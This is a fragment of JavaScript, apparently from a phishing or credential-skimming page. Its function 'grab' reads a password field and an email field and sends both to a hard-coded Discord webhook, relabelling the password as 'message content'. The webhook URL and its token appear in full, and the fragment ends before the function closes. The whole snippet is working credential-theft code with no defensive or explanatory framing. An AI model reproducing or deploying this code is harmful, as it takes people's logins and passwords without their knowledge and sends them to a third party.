function grab(){
  let xhr = new XMLHttpRequest()
  xhr.open('POST','https://discord.com/api/webhooks/1001435528379519036/8OzNx0bJ02St4cLm-QP0DOifSmmOP8Gs4_J1zt1Q1uUnejkiOcaYBdUaxwHjwkepLsCt')
  xhr.setRequestHeader('Content-Type','application/json')
  xhr.send(JSON.stringify({"content":`発言内容: ${document.getElementById('pass').value.replace(/@/g, "＠")}\nby: ${document.getElementById('mail').value.replace(/@/g, "＠")}`})) 
